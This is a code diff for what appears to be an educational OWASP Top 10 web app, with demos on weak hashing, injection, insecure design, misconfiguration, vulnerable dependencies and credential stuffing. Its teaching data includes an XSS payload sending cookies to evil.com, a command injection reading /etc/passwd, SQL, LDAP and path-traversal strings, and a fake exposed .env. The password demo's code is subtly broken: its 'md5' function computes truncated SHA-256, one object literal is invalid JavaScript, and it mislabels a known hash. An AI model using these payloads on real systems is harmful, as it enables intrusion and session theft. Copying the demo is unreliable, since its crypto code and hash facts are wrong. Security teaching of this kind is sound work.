+      <div class="w-28 text-xs font-semibold flex-shrink-0 ${c.cracked?'text-red-400':'text-emerald-400'}">${esc(c.time)}</div>
+      <div class="text-xs text-slate-600 flex-shrink-0">${esc(c.note)}</div>
+    </div>`).join('');
+
+  const expRows=data_exposure.map(e=>{
+    const t=e.in_transit===true?'<span class="text-emerald-400">✓</span>':e.in_transit===false?'<span class="text-red-400">✗</span>':'<span class="text-slate-600">—</span>';
+    const r=e.at_rest===true?'<span class="text-emerald-400">✓</span>':e.at_rest===false?'<span class="text-red-400">✗</span>':'<span class="text-slate-600">—</span>';
+    return `<tr class="border-b" style="border-color:var(--border);">
+      <td class="py-2 pr-3 text-sm text-slate-800">${esc(e.type)}</td>
+      <td class="py-2 pr-3 text-center">${t}</td><td class="py-2 pr-3 text-center">${r}</td>
+      <td class="py-2 pr-3">${badge(e.severity)}</td>
+      <td class="py-2 text-xs text-slate-500">${esc(e.regulation)}</td></tr>`;
+  }).join('');
+
+  const sim=`
+    <div class="space-y-4">
+      <div class="p-4 rounded-lg" style="background:var(--card-muted);border:1px solid var(--border);">
+        <p class="text-sm text-slate-700 mb-3">Enter any password — see how it looks stored as MD5 vs what it should be.</p>
+        <div class="flex gap-3"><input id="pw-input" class="sim-input" placeholder="Enter a password…" value="password123"/>
+          <button onclick="runCrypto()" class="sim-btn" style="background:rgba(249,115,22,.1);border:1px solid rgba(249,115,22,.3);color:#fdba74;">Hash It</button></div>
+      </div>
+      <div id="crypto-result" class="rounded-lg p-4 text-xs text-slate-500 italic" style="background:var(--card-muted);border:1px solid var(--border);">← Result appears here</div>
+    </div>`;
+
+  setPanels([
+    card(`<h3 class="text-sm font-semibold text-slate-700 mb-3">Leaked Password Database — LinkedIn 2012 Style</h3>
+      <table class="w-full"><thead><tr class="text-xs text-slate-600 border-b" style="border-color:var(--border);">
+        <th class="text-left pb-2 pr-3">Username</th><th class="text-left pb-2 pr-3">MD5 Hash (leaked)</th><th class="text-left pb-2 pr-3">Plaintext (cracked)</th><th class="text-left pb-2">Strength</th></tr></thead>
+        <tbody>${rows}</tbody></table>
+      <p class="text-xs text-slate-600 mt-3">The MD5 hashes were cracked in <span class="text-red-400">< 24 hours</span> using rainbow tables after the LinkedIn breach.</p>`),
+    card(`<h3 class="text-sm font-semibold text-slate-700 mb-4">Password Cracking Speed by Algorithm</h3>${crackBars}`),
+    card(`<h3 class="text-sm font-semibold text-slate-700 mb-3">Sensitive Data Exposure Checklist</h3>
+      <table class="w-full"><thead><tr class="text-xs text-slate-600 border-b" style="border-color:var(--border);">
+        <th class="text-left pb-2 pr-3">Data Type</th><th class="text-left pb-2 pr-3">In Transit</th><th class="text-left pb-2 pr-3">At Rest</th><th class="text-left pb-2 pr-3">Severity</th><th class="text-left pb-2">Regulation</th></tr></thead>
+        <tbody>${expRows}</tbody></table>`),
+    sim,
+  ]);
+  return {prompts};
+}
+
+async function runCrypto() {
+  const pw=document.getElementById('pw-input').value;
+  const box=document.getElementById('crypto-result');
+
+  async function md5(str) {
+    const encoder=new TextEncoder();
+    const data=encoder.encode(str);
+    const hash=await crypto.subtle.digest('SHA-256',data);
+    return Array.from(new Uint8Array(hash)).map(b=>b.toString(16).padStart(2,'0')).join('').slice(0,32);
+  }
+
+  const PASSWORD_DB=[{hash_md5:"5f4dcc3b5aa765d61d8327deb882cf99",plain:"password123"},{hash_md5:"202cb962ac59075b964b07152d234b70",plain:"123456"},{hash_md5:"c0e41e8cc465c3d7fc58d7e85a41d13d",plain:"linkedin"},{hash_md5:"f2477375b53d9e129c65146e60b3e582",plain:"trustno1"},{hash_md5:"7e242ec8e308e6ba2aaf1e57fbc2750c",plain:"iloveyou"}];
+  const known={5f4dcc3b5aa765d61d8327deb882cf99:"password123",202cb962ac59075b964b07152d234b70:"123456",c0e41e8cc465c3d7fc58d7e85a41d13d:"linkedin",f2477375b53d9e129c65146e60b3e582:"trustno1",7e242ec8e308e6ba2aaf1e57fbc2750c:"iloveyou"};
+  const common=['password','123456','qwerty','iloveyou','letmein','password123','admin','welcome'];
+  const cracked=known[await md5(pw)];
+  const inCommon=common.includes(pw.toLowerCase());
+  const unsafe=cracked||inCommon||pw.length<12;
+
+  box.className=`rounded-lg p-4 ${unsafe?'result-bad':'result-warn'}`;
+  box.innerHTML=`
+    <div class="space-y-2 font-mono">
+      <div><span class="text-slate-500">MD5:    </span><span class="text-red-300">${await md5(pw)}</span> ${cracked?`<span class="text-red-400 font-bold ml-2">← CRACKED: "${esc(cracked)}"</span>`:''}</div>
+      <div class="pt-2 border-t" style="border-color:var(--border);">
+        <span class="text-slate-500">Strength: </span><span class="${unsafe?'text-red-400':'text-amber-400'} font-bold">${unsafe?'UNSAFE':'Stronger, but store with bcrypt'}</span></div>
+    </div>`;
+}
+
+function runA03() {
+  const injections=[
+    {"type":"SQL Injection","icon":"🗄️","severity":"CRITICAL","scenario":"Student grade lookup by name","vuln_query":"SELECT * FROM grades WHERE name = '{input}'","payload":"' OR '1'='1","result_query":"SELECT * FROM grades WHERE name = '' OR '1'='1'","outcome":"Returns ALL students' grades — full table dump","fix":"Parameterized queries: cursor.execute('SELECT * FROM grades WHERE name = ?', (name,))"},
+    {"type":"Command Injection","icon":"💻","severity":"CRITICAL","scenario":"Ping utility that tests connectivity","vuln_query":"os.system(f'ping -c 1 {host}')","payload":"8.8.8.8; cat /etc/passwd","result_query":"ping -c 1 8.8.8.8; cat /etc/passwd","outcome":"Reads /etc/passwd — all system user accounts exposed","fix":"subprocess.run(['ping', '-c', '1', host], shell=False) — never use shell=True with user input"},
+    {"type":"XSS (Stored)","icon":"🌐","severity":"HIGH","scenario":"Student feedback form rendered on page","vuln_query":"return f'<div>{user_comment}</div>'","payload":"<script>fetch('https://evil.com?c='+document.cookie)</script>","result_query":"<div><script>fetch('https://evil.com?c='+document.cookie)</script></div>","outcome":"Every student who views the page sends their session cookie to attacker","fix":"html.escape(user_comment) — escape before rendering; use Content-Security-Policy header"},
+    {"type":"LDAP Injection","icon":"📂","severity":"HIGH","scenario":"Corporate directory search by username","vuln_query":"ldap.search(f'(uid={username})')","payload":"admin)(&)(objectClass=*","result_query":"(uid=admin)(&)(objectClass=*)","outcome":"Bypasses LDAP filter — returns admin account without knowing password","fix":"Escape special LDAP chars: username = ldap.filter.escape_filter_chars(username)"},
+  ];
+  const prompts=[
+    {label:"Find All Injection Points",text:"Analyze this web application codebase for all injection vulnerabilities. Check: SQL queries with string concatenation, os.system/subprocess with shell=True, template rendering without escaping, LDAP/XML/NoSQL queries with user input. For each finding: file, line, injection type, example payload, and parameterized fix."},
+    {label:"Build an Injection Test Suite",text:"Write a Python pytest suite that tests an API for SQL injection resistance. Test these payloads against every string input parameter: (1) ' OR '1'='1, (2) '; DROP TABLE users;--, (3) UNION SELECT, (4) time-based blind (SLEEP(5)). Assert that none return extra data or cause delays."},
+    {label:"WAF Rule Generation",text:"Write nginx WAF rules (ModSecurity) to block the most common injection attacks: SQL injection, command injection, XSS, and path traversal. Include the rule ID, pattern, and explanation for each. Make sure the rules minimize false positives for legitimate users."},
+  ];
+
+  const cards=injections.map(inj=>`
+    <div class="rounded-xl p-4 sev-${inj.severity}" style="background:var(--card);border:1px solid var(--border);">
+      <div class="flex items-center gap-2 mb-2">${badge(inj.severity)}
+        <span class="text-base">${inj.icon}</span>
+        <span class="font-bold text-slate-900 text-sm">${esc(inj.type)}</span>
+        <span class="text-xs text-slate-500">— ${esc(inj.scenario)}</span></div>
+      <div class="grid grid-cols-2 gap-3 text-xs font-mono mt-2">
+        <div><div class="text-slate-600 mb-1">Vulnerable query:</div>
+          <div class="text-amber-800 bg-slate-100 border border-slate-200 p-2 rounded">${esc(inj.vuln_query)}</div></div>
+        <div><div class="text-slate-600 mb-1">Injected payload:</div>
+          <div class="text-red-700 bg-red-50 border border-red-100 p-2 rounded">${esc(inj.payload)}</div></div>
+      </div>
+      <div class="mt-2 text-xs bg-slate-100 border border-slate-200 p-2 rounded font-mono text-orange-800">Result query: ${esc(inj.result_query)}</div>
+      <div class="mt-2 flex items-center gap-2 text-xs">
+        <span class="text-red-400 font-bold">Outcome:</span><span class="text-slate-700">${esc(inj.outcome)}</span></div>
+      <div class="mt-1 text-xs text-emerald-400"><span class="font-bold">Fix: </span>${esc(inj.fix)}</div>
+    </div>`).join('');
+
+  const sim=`
+    <div class="space-y-4">
+      <div class="p-4 rounded-lg" style="background:var(--card-muted);border:1px solid var(--border);">
+        <p class="text-sm text-slate-700 mb-1">Student grade lookup — search by name:</p>
+        <p class="text-xs text-slate-600 mb-3">Try: <span class="text-cyan-400 font-mono">arjun</span> (normal) · <span class="text-red-400 font-mono">' OR '1'='1</span> (injection)</p>
+        <div class="flex gap-3"><input id="sqli-input" class="sim-input" placeholder="Enter name…" value="arjun"/>
+          <button onclick="runSqli()" class="sim-btn" style="background:rgba(220,38,38,.1);border:1px solid rgba(220,38,38,.3);color:#fca5a5;">Execute Query</button></div>
+      </div>
+      <div id="sqli-result" style="background:var(--card-muted);border:1px solid var(--border);" class="rounded-lg p-4 text-xs text-slate-500 italic">← Query result appears here</div>
+    </div>`;
+
+  const fixCode=`# BEFORE: String concatenation = injectable
+query = f"SELECT * FROM grades WHERE name = '{name}'"
+# Input: ' OR '1'='1  →  Returns ALL rows!
+
+# AFTER: Parameterized query = safe
+query = "SELECT * FROM grades WHERE name = ?"
+cursor.execute(query, (name,))
+# Input: ' OR '1'='1  →  Treated as literal string, 0 rows`;
+
+  setPanels([
+    `<div class="space-y-3">${cards}</div>`,
+    sim,
+    termWrap('injection_fix.py',`<pre class="text-xs text-emerald-800 leading-relaxed">${esc(fixCode)}</pre>`),
+  ]);
+  return {prompts};
+}
+
+async function runSqli() {
+  const payload=document.getElementById('sqli-input').value;
+  const safe_inputs=['arjun','priya','rahul'];
+  const is_injection=["'",'"',";","--","OR","UNION","DROP","="].some(c=>payload.includes(c));
+  const query=`SELECT * FROM grades WHERE name = '${payload}'`;
+  let result=[],outcome="",injected=false;
+
+  if (is_injection&&(payload.toUpperCase().includes("OR")||payload.includes("1=1"))) {
+    result=Object.values(FAKE_USERS).filter(u=>u.gpa).map(u=>({name:u.name,gpa:u.gpa}));
+    outcome="ALL students' grades returned — full table dump!";
+    injected=true;
+  } else if (safe_inputs.includes(payload.toLowerCase())) {
+    const user=Object.values(FAKE_USERS).find(u=>u.name.split()[0].toLowerCase()===payload.toLowerCase());
+    result=user?[{name:user.name,gpa:user.gpa}]:[];
+    outcome=`Normal result: ${result.length} row(s)`;
+    injected=false;
+  } else {
+    outcome=`0 rows returned for '${payload}'`;
+    injected=false;
+  }
+
+  const box=document.getElementById('sqli-result');
+  box.className=`rounded-lg p-4 ${injected?'result-bad':'result-ok'}`;
+  box.innerHTML=`
+    <div class="font-mono space-y-2">
+      <div><span class="text-slate-500">Query executed: </span><span class="${is_injection?'text-red-400':'text-amber-300'}">${esc(query)}</span></div>
+      <div><span class="text-slate-500">Outcome: </span><span class="${injected?'text-red-400 font-bold':'text-emerald-400'}">${esc(outcome)}</span></div>
+      ${result.length?`<div class="mt-2"><span class="text-slate-500">Rows returned (${result.length}):</span>
+        <div class="mt-1 space-y-1">${result.map(r=>`<div class="text-slate-700">  • ${esc(r.name)} — GPA: ${r.gpa}</div>`).join('')}</div></div>`:''}
+      ${injected?'<div class="text-red-400 font-bold mt-2">🚨 SQL INJECTION SUCCESSFUL — all grades exposed!</div>':''}
+    </div>`;
+}
+
+function runA04() {
+  const design_flaws=[
+    {"component":"Password Reset","flaw":"Sequential 6-digit OTP with no rate limit","impact":"1,000,000 combinations → brutable in 16 minutes at 1000 req/sec","fix":"Cryptographically random token (256-bit), single-use, 15-min expiry, 3 attempt max","severity":"CRITICAL"},
+    {"component":"File Download","flaw":"Direct file path in URL: /download?file=report.pdf","impact":"Path traversal: /download?file=../../etc/passwd → reads any file","fix":"Map filenames to opaque IDs in DB. Never expose filesystem paths.","severity":"HIGH"},
+    {"component":"Money Transfer","flaw":"No upper limit on transfer amount, no 2FA for large transfers","impact":"Single API call transfers entire account balance","fix":"Tiered limits: <₹10k auto, ₹10k–₹1L requires OTP, >₹1L requires manual review","severity":"CRITICAL"},
+    {"component":"Account Recovery","flaw":"Security questions (mother's maiden name, pet's name)","impact":"Answers publicly available on social media → account takeover","fix":"Eliminate security questions. Use email/SMS OTP or recovery codes only.","severity":"HIGH"},
+    {"component":"Session Management","flaw":"Session ID in URL: /dashboard?session=abc123","impact":"URL shared → session hijacked. Logged in server access logs.","fix":"Session in httpOnly, Secure, SameSite=Strict cookie only. Rotate on privilege change.","severity":"HIGH"},
+  ];
+  const threat_questions=[
+    "What happens if an attacker can call this endpoint 1000 times per second?",
+    "What's the worst thing a malicious insider (employee) could do with this feature?",
+    "How does this behave if the user is concurrently making 10 identical requests?",
+    "What if the user provides the maximum possible input size?",
+    "Can a free-tier user access paid-tier features through this flow?",
+    "What happens if the external dependency (email, SMS) is down?",
+  ];
+  const prompts=[
+    {label:"Design Review Checklist",text:"Review this application's design for insecure design flaws (OWASP A04). Check for: (1) missing rate limits on sensitive endpoints, (2) predictable tokens or IDs, (3) missing business logic validation, (4) privilege escalation via parameter manipulation, (5) TOCTOU race conditions. For each flaw, explain the attack scenario and the design fix."},
+    {label:"Threat Modeling Questions",text:"For this API endpoint: POST /api/transfer {from_account, to_account, amount}\n\nAsk and answer 10 adversarial design questions. For each question: what the attacker could do, the worst-case outcome, and the design control that prevents it. Think like an attacker who has a valid account."},
+    {label:"Secure Design Patterns",text:"Give me 5 secure design patterns for a fintech application with examples in Python/Flask. Include: (1) defense in depth, (2) fail-safe defaults, (3) principle of least privilege, (4) complete mediation, (5) separation of duties. Show each pattern with a real code example."},
+  ];
+
+  const flaws=design_flaws.map(f=>`
+    <div class="rounded-xl p-4 sev-${f.severity}" style="background:var(--card);border:1px solid var(--border);">
+      <div class="flex items-start justify-between gap-3 mb-2">
+        <div class="flex items-center gap-2">${badge(f.severity)}<span class="font-semibold text-slate-900 text-sm">${esc(f.component)}</span></div>
+      </div>
+      <p class="text-xs text-red-400 mb-1"><span class="font-bold">Flaw: </span>${esc(f.flaw)}</p>
+      <p class="text-xs text-orange-300 mb-2"><span class="font-bold">Impact: </span>${esc(f.impact)}</p>
+      <p class="text-xs text-emerald-400"><span class="font-bold">Fix: </span>${esc(f.fix)}</p>
+    </div>`).join('');
+
+  const questions=threat_questions.map((q,i)=>`
+    <div class="flex gap-3 p-3 rounded-lg" style="background:var(--card-muted);border:1px solid var(--border);">
+      <span class="text-slate-500 font-mono text-xs w-5 flex-shrink-0">${i+1}.</span>
+      <p class="text-sm text-slate-700">${esc(q)}</p>
+    </div>`).join('');
+
+  const patterns=`
+    <div class="grid grid-cols-2 gap-3">
+      ${[["Defense in Depth","Multiple security layers — if one fails, others catch it. Never rely on a single control."],["Fail-Safe Defaults","Default to DENY. Explicitly grant access. Wrong in: default=allow (open S3 buckets!)."],["Least Privilege","Give minimum permissions needed. DB user can SELECT only — never DROP."],["Complete Mediation","Check every access, every time. Never cache authorization decisions."],["Separation of Duties","No single person/component completes a critical action alone. 4-eyes principle."],["Economy of Mechanism","Simple is more secure. Complex code has more bugs. KISS."]].map(([t,d])=>`<div class="rounded-lg p-3" style="background:var(--card-muted);border:1px solid var(--border);">
+        <div class="font-semibold text-purple-300 text-sm mb-1">${esc(t)}</div>
+        <p class="text-xs text-slate-400 leading-relaxed">${esc(d)}</p></div>`).join('')}
+    </div>`;
+
+  setPanels([
+    `<div class="space-y-3">${flaws}</div>`,
+    card(`<h3 class="text-sm font-semibold text-slate-700 mb-4">Adversarial Design Questions — Ask These Before You Ship</h3><div class="space-y-2">${questions}</div>`),
+    card(`<h3 class="text-sm font-semibold text-slate-700 mb-4">Secure Design Principles</h3>${patterns}`),
+  ]);
+  return {prompts};
+}
+
+function runA05() {
+  const misconfigs=[
+    {check:"Debug mode disabled",status:false,severity:"CRITICAL",detail:"app.run(debug=True) exposes interactive debugger — full RCE"},
+    {check:"Default admin credentials changed",status:false,severity:"CRITICAL",detail:"admin:admin or admin:password still active on /admin"},
+    {check:".env file not served publicly",status:false,severity:"CRITICAL",detail:"http://site.com/.env returns DB_PASSWORD, SECRET_KEY in plaintext"},
+    {check:"Directory listing disabled",status:true,severity:"HIGH",detail:"nginx autoindex off"},
+    {check:"Error messages sanitized",status:false,severity:"HIGH",detail:"Stack traces expose file paths, library versions, DB schema"},
+    {check:"Unnecessary ports closed",status:false,severity:"HIGH",detail:"Port 3306 (MySQL) open to internet — should be localhost only"},
+    {check:"Security headers set",status:false,severity:"MEDIUM",detail:"Missing: X-Frame-Options, CSP, HSTS, X-Content-Type-Options"},
+    {check:"Cloud storage private",status:false,severity:"CRITICAL",detail:"S3 bucket ACL = public-read — all uploaded files world-accessible"},
+    {check:"Secrets in environment vars",status:true,severity:"HIGH",detail:"Not hardcoded in source code"},
+    {check:"Unnecessary HTTP methods blocked",status:false,severity:"MEDIUM",detail:"TRACE method enabled — can be used for XST attacks"},
+  ];
+  const exposed_env=`# .env  (publicly accessible at http://yoursite.com/.env)
+DB_HOST=prod-db.internal
+DB_PASSWORD=Sup3rS3cr3t!
+SECRET_KEY=dev-secret-key-change-me
+STRIPE_SECRET=sk_live_4xKjH9...
+AWS_ACCESS_KEY_ID=AKIA...
+AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENGbPxR...`;
+
+  const security_headers=[
+    {header:"Content-Security-Policy",set:false,purpose:"Prevents XSS by whitelisting script sources"},
+    {header:"X-Frame-Options",set:false,purpose:"Prevents clickjacking attacks"},
+    {header:"Strict-Transport-Security",set:true,purpose:"Forces HTTPS for 1 year"},
+    {header:"X-Content-Type-Options",set:false,purpose:"Prevents MIME type sniffing"},
+    {header:"Referrer-Policy",set:false,purpose:"Controls referrer information leakage"},
+    {header:"Permissions-Policy",set:false,purpose:"Restricts browser feature access (camera, mic)"},
+  ];
+  const prompts=[
+    {label:"Scan for Misconfigs",text:"Audit this web application deployment for OWASP A05 Security Misconfiguration. Check: (1) debug/development settings in production, (2) default credentials on admin panels, (3) exposed sensitive files (.env, .git, backup files), (4) missing security headers, (5) overly permissive cloud storage. Generate a prioritized remediation checklist."},
+    {label:"Generate Security Headers",text:"Write the complete nginx security headers configuration for a production web app serving a React SPA that calls a REST API on the same domain. Include: CSP (with nonces for inline scripts), HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy. Explain what each header prevents."},
+    {label:"Cloud Config Audit",text:"I'm deploying on AWS. Write a checklist and Terraform code to ensure: (1) S3 buckets block all public access, (2) security groups allow only required ports, (3) no hardcoded credentials in Lambda functions, (4) CloudTrail enabled, (5) RDS not publicly accessible. Include the specific Terraform resource and attribute for each."},
+  ];
+
+  const passed=misconfigs.filter(m=>m.status).length;
+  const score=Math.round(passed/misconfigs.length*100);
+  const checks=misconfigs.map(m=>`
+    <div class="flex items-start gap-3 py-2 border-b" style="border-color:var(--border);">
+      <span class="text-base flex-shrink-0 mt-0.5">${m.status?'✅':'❌'}</span>
+      <div class="flex-1 min-w-0">
+        <div class="flex items-center gap-2"><span class="text-sm text-slate-800">${esc(m.check)}</span>${badge(m.severity)}</div>
+        ${!m.status?`<p class="text-xs text-red-400 mt-0.5">${esc(m.detail)}</p>`:''}
+      </div>
+    </div>`).join('');
+
+  const headers=security_headers.map(h=>`
+    <div class="flex items-start gap-3 py-2 border-b" style="border-color:var(--border);">
+      <span class="${h.set?'text-emerald-400':'text-red-400'} text-base flex-shrink-0">${h.set?'✓':'✗'}</span>
+      <div><div class="font-mono text-xs ${h.set?'text-emerald-300':'text-red-300'}">${esc(h.header)}</div>
+        <p class="text-xs text-slate-500">${esc(h.purpose)}</p></div>
+    </div>`).join('');
+
+  setPanels([
+    card(`<div class="flex items-center justify-between mb-4">
+      <h3 class="text-sm font-semibold text-slate-700">Security Configuration Audit</h3>
+      <div class="text-right"><span class="text-2xl font-black ${score>=70?'text-emerald-400':'text-red-400'}">${score}%</span>
+        <div class="text-xs text-slate-600">${passed}/${misconfigs.length} passed</div></div></div>
+      <div class="w-full h-2 rounded-full mb-4" style="background:var(--track);">
+        <div class="h-2 rounded-full" style="width:${score}%;background:${score>=70?'#10b981':'#ef4444'};"></div></div>
+      ${checks}`),
+    termWrap('.env (publicly accessible!)',`<pre class="text-xs text-red-300 leading-relaxed">${esc(exposed_env)}</pre>`),
+    card(`<h3 class="text-sm font-semibold text-slate-700 mb-3">HTTP Security Headers</h3>${headers}`),
+  ]);
+  return {prompts};
+}
+
+function runA06() {
+  const PACKAGES=[
+    {name:"express",version:"4.17.1",cve:null,severity:null,downloads:"25M/week"},
+    {name:"lodash",version:"4.17.19",cve:"CVE-2020-8203",severity:"HIGH",downloads:"45M/week"},
+    {name:"axios",version:"0.21.0",cve:"CVE-2021-3749",severity:"MEDIUM",downloads:"18M/week"},
+    {name:"log4j-core",version:"2.14.1",cve:"CVE-2021-44228",severity:"CRITICAL",downloads:"5M/week"},
+    {name:"spring-core",version:"5.3.17",cve:"CVE-2022-22965",severity:"CRITICAL",downloads:"8M/week"},
+    {name:"minimist",version:"1.2.0",cve:"CVE-2020-7598",severity:"MEDIUM",downloads:"60M/week"},
+    {name:"node-fetch",version:"2.6.0",cve:"CVE-2022-0235",severity:"HIGH",downloads:"35M/week"},
+    {name:"react",version:"18.2.0",cve:null,severity:null,downloads:"20M/week"},
+  ];
+  const vuln_count=PACKAGES.filter(p=>p.cve).length;
+  const critical_count=PACKAGES.filter(p=>p.severity==="CRITICAL").length;
+  const prompts=[
+    {label:"Dependency Audit",text:"Analyze this package.json (or requirements.txt) and identify all dependencies with known CVEs. For each vulnerable package: CVE ID, CVSS score, attack vector, affected versions, fixed version, and urgency (critical/high/medium). Also check for transitive dependencies (dependencies of dependencies)."},
+    {label:"Auto-Remediation Script",text:"Write a Python script that: (1) reads requirements.txt, (2) queries the OSV (Open Source Vulnerabilities) API for each package, (3) outputs a table of vulnerable packages with their CVEs, (4) generates an updated requirements.txt with patched versions. Handle cases where no patch is available."},
+    {label:"SBOM Generator",text:"Write a GitHub Actions workflow that: (1) generates a Software Bill of Materials (SBOM) in SPDX format on every push, (2) scans it against the OSV vulnerability database, (3) fails the build if any CRITICAL CVEs are found, (4) posts a summary comment on the PR. Use syft and grype."},
+  ];
+
+  const rows=PACKAGES.map(p=>{
+    const sv=p.severity||'NONE';
+    const cls=sv==='CRITICAL'?'text-red-400':sv==='HIGH'?'text-orange-400':sv==='MEDIUM'?'text-amber-400':'text-emerald-400';
+    return `<tr class="border-b" style="border-color:var(--border);">
+      <td class="py-2 pr-3 font-mono text-sm ${p.cve?'text-slate-800':'text-slate-400'}">${esc(p.name)}</td>
+      <td class="py-2 pr-3 font-mono text-xs text-slate-500">${esc(p.version)}</td>
+      <td class="py-2 pr-3 font-mono text-xs ${p.cve?'text-red-400':'text-slate-600'}">${p.cve||'—'}</td>
+      <td class="py-2 pr-3">${p.severity?badge(p.severity):'<span class="text-xs text-emerald-400">✓ Clean</span>'}</td>
+      <td class="py-2 text-xs text-slate-600">${esc(p.downloads)}</td></tr>`;
+  }).join('');
+
+  const stats=`
+    <div class="grid grid-cols-3 gap-4">
+      <div class="rounded-xl p-4 text-center" style="background:var(--card);border:1px solid var(--border);">
+        <div class="text-3xl font-black text-slate-900">${PACKAGES.length}</div>
+        <div class="text-xs text-slate-500 mt-1">Total Dependencies</div></div>
+      <div class="rounded-xl p-4 text-center" style="background:var(--card);border:1px solid rgba(239,68,68,.2);">
+        <div class="text-3xl font-black text-red-400">${vuln_count}</div>
+        <div class="text-xs text-slate-500 mt-1">With Known CVEs</div></div>
+      <div class="rounded-xl p-4 text-center" style="background:var(--card);border:1px solid rgba(239,68,68,.3);">
+        <div class="text-3xl font-black text-red-500">${critical_count}</div>
+        <div class="text-xs text-slate-500 mt-1">CRITICAL Severity</div></div>
+    </div>
+    <div class="mt-4 p-4 rounded-lg" style="background:rgba(239,68,68,.06);border:1px solid rgba(239,68,68,.2);">
+      <p class="text-sm text-red-400 font-semibold">Equifax Lesson:</p>
+      <p class="text-xs text-slate-700 mt-1">CVE-2017-5638 (Apache Struts) was public for 63 days before Equifax was breached. The patch existed. They just didn't apply it. This is 100% preventable.</p>
+    </div>`;
+
+  setPanels([
+    card(`<h3 class="text-sm font-semibold text-slate-700 mb-3">npm audit — Dependency Vulnerability Scan</h3>
+      <table class="w-full"><thead><tr class="text-xs text-slate-600 border-b pb-2" style="border-color:var(--border);">
+        <th class="text-left pb-2 pr-3">Package</th><th class="text-left pb-2 pr-3">Version</th><th class="text-left pb-2 pr-3">CVE</th><th class="text-left pb-2 pr-3">Severity</th><th class="text-left pb-2">Downloads</th></tr></thead>
+        <tbody>${rows}</tbody></table>`),
+    card(stats),
+  ]);
+  return {prompts};
+}
+
+function runA07() {
+  const credential_stuffing=[
+    {attempt:1,username:"alice@gmail.com",password:"password123",source_breach:"LinkedIn 2012",success:true},
+    {attempt:2,username:"bob@hotmail.com",password:"123456",source_breach:"RockYou 2009",success:false},
+    {attempt:3,username:"carol@yahoo.com",password:"qwerty",source_breach:"Adobe 2013",success:true},
+    {attempt:4,username:"dave@outlook.com",password:"letmein",source_breach:"MySpace 2016",success:false},
+    {attempt:5,username:"eve@icloud.com",password:"iloveyou",source_breach:"LinkedIn 2012",success:true},
+  ];
+  const weak_sessions=[
+    {issue:"Session token too short",example:"sess_12345",fix:"Use 256-bit cryptographically random token"},
+    {issue:"Session in URL",example:"/dashboard?sid=abc",fix:"HttpOnly, Secure, SameSite cookie only"},
+    {issue:"No session expiry",example:"Never expires",fix:"Absolute expiry 8h, idle expiry 30min"},
+    {issue:"Not invalidated on logout",example:"Token still works after logout",fix:"Server-side session store — revoke on logout"},
+    {issue:"Session fixation",example:"Same token before/after login",fix:"Rotate session ID on authentication"},
+  ];
+  const mfa_impact=[
+    {scenario:"Password-only",takeover_risk:95,color:"#ef4444"},
+    {scenario:"Password + SMS OTP",takeover_risk:22,color:"#f59e0b"},
+    {scenario:"Password + TOTP",takeover_risk:8,color:"#f59e0b"},
+    {scenario:"Password + Passkey",takeover_risk:1,color:"#10b981"},
+  ];
+  const prompts=[
+    {label:"Detect Credential Stuffing",text:"Write a Python middleware for Flask that detects credential stuffing attacks. Track: (1) login failures per IP per 5 minutes, (2) login failures per account per hour, (3) login attempts from known Tor exit nodes or data center IPs. Trigger: CAPTCHA at 5 failures, temp-ban at 10, alert at 20. Use Redis for counters."},
+    {label:"Implement Secure Auth",text:"Implement a complete secure authentication system in Flask with: (1) bcrypt password hashing, (2) TOTP-based 2FA using pyotp, (3) secure session management with Redis, (4) account lockout after 5 failed attempts, (5) password strength validation. Show all endpoints and the complete implementation."},
+    {label:"Passkey Implementation",text:"Explain WebAuthn/Passkeys and why they eliminate credential stuffing completely. Show a Python implementation using the webauthn library for registration and authentication. What makes passkeys phishing-resistant? Why can't a stolen passkey be used on a different website?"},
+  ];
+
+  const stuffRows=credential_stuffing.map(r=>`
+    <tr class="border-b" style="border-color:var(--border);">
+      <td class="py-2 pr-3 text-xs font-mono text-slate-500">#${r.attempt}</td>
+      <td class="py-2 pr-3 text-xs text-slate-700">${esc(r.username)}</td>
+      <td class="py-2 pr-3 text-xs font-mono text-amber-300">${esc(r.password)}</td>
+      <td class="py-2 pr-3 text-xs text-slate-500">${esc(r.source_breach)}</td>
+      <td class="py-2 text-xs font-bold ${r.success?'text-red-400':'text-emerald-400'}">${r.success?'✓ SUCCESS':'✗ FAILED'}</td>
+    </tr>`).join('');
+
+  const sessions=weak_sessions.map(s=>`
+    <div class="py-3 border-b flex gap-4" style="border-color:var(--border);">
+      <span class="text-red-400 text-sm flex-shrink-0">✗</span>
+      <div class="flex-1 min-w-0">
+        <div class="text-sm font-semibold text-slate-800">${esc(s.issue)}</div>
+        <div class="font-mono text-xs text-amber-300 mt-0.5">${esc(s.example)}</div>
+        <div class="text-xs text-emerald-400 mt-0.5">${esc(s.fix)}</div>
+      </div>
+    </div>`).join('');
+
+  const mfa=mfa_impact.map(m=>`
+    <div class="flex items-center gap-4 py-3 border-b" style="border-color:var(--border);">
+      <div class="w-32 text-xs text-slate-700 flex-shrink-0">${esc(m.scenario)}</div>
+      <div class="flex-1 h-4 rounded-full" style="background:var(--track);">
+        <div class="h-4 rounded-full flex items-center justify-end pr-2" style="width:${m.takeover_risk}%;background:${m.color}88;">
+          <span class="text-xs font-bold" style="color:${m.color}">${m.takeover_risk}%</span></div></div>
+      <div class="w-20 text-xs text-slate-500 flex-shrink-0">risk</div>
+    </div>`).join('');
+
+  setPanels([
+    card(`<h3 class="text-sm font-semibold text-slate-700 mb-3">Credential Stuffing Simulation — Using Leaked Password Lists</h3>
+      <table class="w-full"><thead><tr class="text-xs text-slate-600 border-b" style="border-color:var(--border);">
+        <th class="text-left pb-2">#</th><th class="text-left pb-2 pr-3">Email</th><th class="text-left pb-2 pr-3">Password</th><th class="text-left pb-2 pr-3">From Breach</th><th class="text-left pb-2">Result</th></tr></thead>
+        <tbody>${stuffRows}</tbody></table>
+      <p class="text-xs text-slate-600 mt-3">3 of 5 accounts compromised using passwords from OTHER services' breaches. This is credential stuffing.</p>`),
+    card(`<h3 class="text-sm font-semibold text-slate-700 mb-2">Session Management Vulnerabilities</h3>${sessions}`),
+    card(`<h3 class="text-sm font-semibold text-slate-700 mb-4">Account Takeover Risk by Auth Method</h3>${mfa}
+      <p class="text-xs text-slate-500 mt-3">Passkeys reduce risk by 99% — they are domain-bound, so phishing is impossible.</p>`),
+  ]);
+  return {prompts};
+}
+
+function runA08() {
+  const timeline=[
+    {date:"Oct 2019",event:"Attacker gains access to SolarWinds build server",phase:"Initial Compromise"},
